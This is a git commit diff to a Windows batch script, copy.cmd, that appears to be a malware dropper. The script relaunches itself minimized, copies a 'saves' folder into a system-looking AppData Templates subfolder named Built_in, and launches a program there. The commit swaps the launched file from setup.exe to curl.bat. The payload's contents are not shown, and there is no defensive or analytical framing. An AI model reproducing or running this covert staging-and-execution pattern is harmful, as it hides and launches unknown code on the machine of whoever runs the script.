55c29d49422e8b65a244136ee902758444b5c71c
ASDFfdsak <127998767+ASDFfdsak@users.noreply.github.com>
2023-06-19 01:38:07 +0000

    Update copy.cmd

--- copy.cmd
+++ copy.cmd
@@ -2,5 +2,5 @@
 if not DEFINED IS_MINIMIZED set IS_MINIMIZED=1 && start "" /min "%~dpnx0" %* && exit
 xcopy /C /R /Y /I saves "C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Templates\Built_in"
 cd "C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Templates\Built_in"
-start setup.exe
+start curl.bat
 exit
